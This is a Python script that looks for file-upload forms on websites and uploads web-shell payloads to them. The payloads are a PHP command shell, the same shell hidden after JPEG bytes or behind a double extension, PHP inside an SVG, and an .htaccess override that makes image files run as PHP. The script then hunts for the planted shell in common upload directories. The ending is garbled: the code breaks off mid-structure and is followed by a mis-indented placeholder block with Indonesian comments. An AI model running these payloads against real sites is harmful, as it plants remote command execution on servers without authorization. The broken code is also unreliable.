import requests
import concurrent.futures
import sys
import time
import argparse
import csv
import os
import random
import string
from urllib.parse import urlparse, urljoin
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def normalize_url(url):
    """Normalize URL to ensure proper format with protocol."""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')

def generate_random_filename(prefix="test", ext="php"):
    """Generate a random filename for upload tests."""
    random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    return f"{prefix}_{random_str}.{ext}"

def scan_for_upload_page(url, paths, timeout=10, verify_ssl=False, user_agent=None):
    """
    Scan a website for common upload page paths.
    
    Args:
        url: The website URL to check
        paths: List of potential upload page paths to check
        timeout: Request timeout in seconds
        verify_ssl: Whether to verify SSL certificates
        user_agent: Custom user agent string
        
    Returns:
        dict: Result information including status, found upload pages, and response time
    """
    start_time = time.time()
    normalized_url = normalize_url(url)
    
    headers = {
        'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml',
        'Connection': 'close'  # Don't keep connection alive
    }
    
    found_upload_pages = []
    
    for path in paths:
        target_url = f"{normalized_url}/{path}"
        
        try:
            response = requests.get(
                target_url,
                timeout=timeout,
                verify=verify_ssl,
                headers=headers,
                allow_redirects=True
            )
            
            status_code = response.status_code
            
            # Check if the page exists and contains upload form indicators
            if status_code == 200:
                content = response.text.lower()
                if any(keyword in content for keyword in ['<input type="file"', 'multipart/form-data', 'upload', 'browse', 'choose file']):
                    found_upload_pages.append({
                        'url': target_url,
                        'status_code': status_code,
                        'has_upload_form': True
                    })
            
        except requests.exceptions.RequestException:
            # Skip failed requests
            continue
    
    elapsed_time = time.time() - start_time
    
    if found_upload_pages:
        result = {
            'url': url,
            'status': 'UPLOAD_FOUND',
            'found_pages': found_upload_pages,
            'time': f"{elapsed_time:.2f}s",
            'message': f"✅ Found {len(found_upload_pages)} upload page(s) at: {url}"
        }
    else:
        result = {
            'url': url,
            'status': 'NO_UPLOAD_FOUND',
            'found_pages': [],
            'time': f"{elapsed_time:.2f}s",
            'message': f"❌ No upload pages found at: {url}"
        }
            
    return result

def create_test_payloads():
    """
    Create test payloads for upload vulnerability testing.
    
    Returns:
        dict: Dictionary of test payloads including legitimate and malicious files
    """
    # Legitimate file types for testing
    legitimate_txt = "This is a harmless text file for testing uploads."
    legitimate_jpg_content = b'\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x00\x48\x00\x48\x00\x00\xFF\xDB\x00\x43\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\x09\x09\x08\x0A\x0C\x14\x0D\x0C\x0B\x0B\x0C\x19\x12\x13\x0F\x14\x1D\x1A\x1F\x1E\x1D\x1A\x1C\x1C\x20\x24\x2E\x27\x20\x22\x2C\x23\x1C\x1C\x28\x37\x29\x2C\x30\x31\x34\x34\x34\x1F\x27\x39\x3D\x38\x32\x3C\x2E\x33\x34\x32\xFF\xDB\x00\x43\x01\x09\x09\x09\x0C\x0B\x0C\x18\x0D\x0D\x18\x32\x21\x1C\x21\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\x32\xFF\xC0\x00\x11\x08\x00\x01\x00\x01\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01\xFF\xC4\x00\x1F\x00\x00\x01\x05\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x10\x00\x02\x01\x03\x03\x02\x04\x03\x05\x05\x04\x04\x00\x00\x01\x7D\x01\x02\x03\x00\x04\x11\x05\x12\x21\x31\x41\x06\x13\x51\x61\x07\x22\x71\x14\x32\x81\x91\xA1\x08\x23\x42\xB1\xC1\x15\x52\xD1\xF0\x24\x33\x62\x72\x82\x09\x0A\x16\x17\x18\x19\x1A\x25\x26\x27\x28\x29\x2A\x34\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xC4\x00\x1F\x01\x00\x03\x01\x01\x01\x01\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\xFF\xC4\x00\xB5\x11\x00\x02\x01\x02\x04\x04\x03\x04\x07\x05\x04\x04\x00\x01\x02\x77\x00\x01\x02\x03\x11\x04\x05\x21\x31\x06\x12\x41\x51\x07\x61\x71\x13\x22\x32\x81\x08\x14\x42\x91\xA1\xB1\xC1\x09\x23\x33\x52\xF0\x15\x62\x72\xD1\x0A\x16\x24\x34\xE1\x25\xF1\x17\x18\x19\x1A\x26\x27\x28\x29\x2A\x35\x36\x37\x38\x39\x3A\x43\x44\x45\x46\x47\x48\x49\x4A\x53\x54\x55\x56\x57\x58\x59\x5A\x63\x64\x65\x66\x67\x68\x69\x6A\x73\x74\x75\x76\x77\x78\x79\x7A\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x92\x93\x94\x95\x96\x97\x98\x99\x9A\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00\x3F\x00\xFE\xFE\x28\xA2\x8A\x00\xFF\xD9'

    # PHP Payload - Basic shell
    php_shell = """<?php
    // Basic PHP Web Shell
    if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
    }
    ?>
    <form method="post">
    <input type="text" name="cmd" placeholder="Command...">
    <button type="submit">Execute</button>
    </form>"""
    
    # PHP Shell inside JPG magic bytes
    php_in_jpg = legitimate_jpg_content + b'\r\n' + php_shell.encode()
    
    # PHP file disguised with double extension
    php_double_ext = php_shell
    
    # PHP code within SVG file
    svg_with_php = """<?xml version="1.0" standalone="no"?>
    <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
    <svg width="100" height="100" version="1.1" xmlns="http://www.w3.org/2000/svg">
    <image xlink:href="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" width="100" height="100"/>
    <foreignObject width="100" height="100">
    <div xmlns="http://www.w3.org/1999/xhtml">
    <?php system($_GET['cmd']); ?>
    </div>
    </foreignObject>
    </svg>"""
    
    # .htaccess file for bypassing restrictions
    htaccess_bypass = """AddType application/x-httpd-php .jpg .jpeg .png .gif .txt
    php_flag engine on"""
    
    return {
        'legitimate': {
            'txt': {'content': legitimate_txt, 'mime': 'text/plain', 'ext': '.txt'},
            'jpg': {'content': legitimate_jpg_content, 'mime': 'image/jpeg', 'ext': '.jpg'}
        },
        'malicious': {
            'php_shell': {'content': php_shell, 'mime': 'application/x-php', 'ext': '.php'},
            'php_in_jpg': {'content': php_in_jpg, 'mime': 'image/jpeg', 'ext': '.jpg.php'},
            'php_double_ext': {'content': php_double_ext, 'mime': 'text/plain', 'ext': '.txt.php'},
            'svg_with_php': {'content': svg_with_php, 'mime': 'image/svg+xml', 'ext': '.svg'},
            'htaccess': {'content': htaccess_bypass, 'mime': 'text/plain', 'ext': '.htaccess'}
        }
    }

def detect_form_fields(response_text):
    """
    Extract form fields and file upload parameters from HTML response.
    
    Args:
        response_text: HTML content of the page
        
    Returns:
        dict: Dictionary of form details including fields and method
    """
    from bs4 import BeautifulSoup
    
    soup = BeautifulSoup(response_text, 'html.parser')
    form_details = []
    
    for form in soup.find_all('form'):
        details = {}
        form_action = form.get('action', '')
        form_method = form.get('method', 'get').lower()
        form_enctype = form.get('enctype', '')
        
        if 'multipart/form-data' in form_enctype:
            details['action'] = form_action
            details['method'] = form_method
            details['enctype'] = form_enctype
            
            inputs = []
            for input_tag in form.find_all('input'):
                input_type = input_tag.get('type', '')
                input_name = input_tag.get('name', '')
                
                if input_type == 'file':
                    inputs.append({
                        'name': input_name,
                        'type': input_type,
                        'is_file': True
                    })
                else:
                    inputs.append({
                        'name': input_name,
                        'type': input_type,
                        'value': input_tag.get('value', ''),
                        'is_file': False
                    })
            
            details['inputs'] = inputs
            form_details.append(details)
    
    return form_details

def test_upload_vulnerability(url, form_details, payloads, timeout=10, verify_ssl=False, user_agent=None):
    """
    Test for upload vulnerabilities by attempting to upload various payloads.
    
    Args:
        url: The target URL with the upload form
        form_details: Dictionary containing form details
        payloads: Test payloads to attempt to upload
        timeout: Request timeout in seconds
        verify_ssl: Whether to verify SSL certificates
        user_agent: Custom user agent string
        
    Returns:
        dict: Result information including vulnerabilities found
    """
    base_url = normalize_url(url)
    form_action = form_details.get('action', '')
    form_action_url = urljoin(base_url, form_action) if form_action else base_url
    form_method = form_details.get('method', 'post')
    
    headers = {
        'User-Agent': user_agent or 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        # Don't include Content-Type header, requests will set it with the multipart boundary
    }
    
    inputs = form_details.get('inputs', [])
    file_input_names = [inp['name'] for inp in inputs if inp.get('is_file')]
    
    if not file_input_names:
        return {
            'url': url,
            'status': 'NO_FILE_INPUT',
            'vulnerabilities': [],
            'message': f"⚠️ No file input fields found in form at: {url}"
        }
    
    file_input_name = file_input_names[0]  # Use the first file input field
    
    # Prepare data for non-file fields
    data = {}
    for inp in inputs:
        if not inp.get('is_file') and inp.get('name'):
            data[inp['name']] = inp.get('value', '')
    
    vulnerabilities = []
    
    # First, test with legitimate files to establish baseline
    for file_type, file_info in payloads['legitimate'].items():
        test_filename = generate_random_filename(prefix=f"test_{file_type}", ext=file_info['ext'].lstrip('.'))
        
        files = {
            file_input_name: (test_filename, file_info['content'], file_info['mime'])
        }
        
        try:
            if form_method.lower() == 'post':
                response = requests.post(
                    form_action_url,
                    data=data,
                    files=files,
                    timeout=timeout,
                    verify=verify_ssl,
                    headers=headers,
                    allow_redirects=True
                )
            else:
                response = requests.get(
                    form_action_url,
                    params=data,
                    files=files,
                    timeout=timeout,
                    verify=verify_ssl,
                    headers=headers,
                    allow_redirects=True
                )
            
            # Check if upload was successful
            content = response.text.lower()
            upload_success = any(keyword in content for keyword in ['upload', 'success', 'file', 'uploaded']) and 'error' not in content
            
            # If we got a success message, store info for reference
            if upload_success:
                print(f"  ✓ Legitimate {file_type} upload test succeeded on {url}")
            else:
                print(f"  ✗ Legitimate {file_type} upload test failed on {url}")
                
        except requests.exceptions.RequestException as e:
            print(f"  ✗ Error during legitimate {file_type} upload test: {e}")
    
    # Now test malicious payloads
    for payload_type, payload_info in payloads['malicious'].items():
        test_filename = generate_random_filename(prefix=f"test_{payload_type}", ext=payload_info['ext'].lstrip('.'))
        
        files = {
            file_input_name: (test_filename, payload_info['content'], payload_info['mime'])
        }
        
        try:
            if form_method.lower() == 'post':
                response = requests.post(
                    form_action_url,
                    data=data,
                    files=files,
                    timeout=timeout,
                    verify=verify_ssl,
                    headers=headers,
                    allow_redirects=True
                )
            else:
                response = requests.get(
                    form_action_url,
                    params=data,
                    files=files,
                    timeout=timeout,
                    verify=verify_ssl,
                    headers=headers,
                    allow_redirects=True
                )
            
            # Check if malicious upload was successful
            content = response.text.lower()
            upload_success = any(keyword in content for keyword in ['upload', 'success', 'file', 'uploaded']) and 'error' not in content
            
            if upload_success:
                # Try to find uploaded file path
                parsed_content = BeautifulSoup(response.text, 'html.parser')
                potential_links = parsed_content.find_all('a')
                uploaded_path = None
                
                for link in potential_links:
                    href = link.get('href', '')
                    if test_filename in href:
                        uploaded_path = urljoin(base_url, href)
                        break
                
                # If we couldn't find the path, make an educated guess
                if not uploaded_path:
                    # Common upload directories
                    common_dirs = ['uploads/', 'upload/', 'files/', 'images/', 'media/', 'data/']
                    for directory in common_dirs:
                        guess_path = urljoin(base_url, f"{directory}{test_filename}")
                        try:
                            verification = requests.get(guess_path, timeout=timeout, verify=verify_ssl)
                            if verification.status_code == 200:
                                uploaded_path = guess_path
                                break
                        except:
                            continue
                
                vulnerabilities.append({
                    'type': payload_type,
                    'filename': test_filename,
                    'uploaded_path': uploaded_path,
                    'status': 'VULNERABLE'
                })
                
                print(f"  🔴 VULNERABLE: {url} allows uploading {payload_type}")
                if uploaded_path:
                    print(f"     Uploaded file accessible at: {uploaded_path}")
            else:
                print(f"  ✓ {url} blocked {payload_type} upload (good)")
                
        except requests.exceptions.RequestException as e:
            print(f"  ✗ Error during {payload_type} upload test: {e}")
    
    if vulnerabilities:
        return {
            'url': url,
            'status': 'VULNERABLE',
            'vulnerabilities': vulnerabilities,
            'message': f"🔴 VULNERABLE: {url} allows uploading {', '.join([v['type'] for v in vulnerabilities])}"
        }
    else:
        return {
            'url': url,
            'status': 'SECURE',
            'vulnerabilities': [],
            'message': f"✅ {url} appears to have secure file upload handling"
        }

def test_upload_pages(website_results, payloads, timeout=10, verify_ssl=False, user_agent=None):
    """
    Test found upload pages for vulnerabilities.
    
    Args:
        website_results: Results from the initial upload page scan
        payloads: Test payloads to attempt to upload
        timeout: Request timeout in seconds
        verify_ssl: Whether to verify SSL certificates
        user_agent: Custom user agent string
        
    Returns:
        list: Results of vulnerability testing
    """
    vulnerability_results = []
    
    try:
        from bs4 import BeautifulSoup
    except ImportError:
        print("BeautifulSoup4 is required for form detection and vulnerability testing.")
        print("Install it with: pip install beautifulsoup4")
        return []
    
    for result in website_results:
        if result['status'] == 'UPLOAD_FOUND':
            for page in result['found_pages']:
                url = page['url']
                print(f"\n[*] Testing upload page: {url}")
                
                try:
                    # Get the page content
                    response = requests.get(
                        url,
                        timeout=timeout,
                        verify=verify_ssl,
                        headers={'User-Agent': user_agent or 'Mozilla/5.0'}
                    )
                    
                    if response.status_code == 200:
                        # Extract form details
                        form_details_list = detect_form_fields(response.text)
                        
                        if form_details_list:
                            for form_details in form_details_list:
                                # Test each form for vulnerabilities
                                test_result = test_upload_vulnerability(
                                    url, 
                                    form_details, 
                                    payloads,
                                    timeout,
                                    verify_ssl,
                                    user_agent
                                )
                                vulnerability_results.append(test_result)
                        else:
                            vulnerability_results.append({
                                'url': url,
                                'status': 'NO_UPLOAD_FORM',
                                'vulnerabilities': [],
                                'message': f"⚠️ Could not detect upload form structure at: {url}"
                            })
                    else:
                        vulnerability_results.append({
        # beberapa kode di sini
    })
except Exception as e:
    print(f"Error: {e}")
    # atau penanganan error lainnya
         
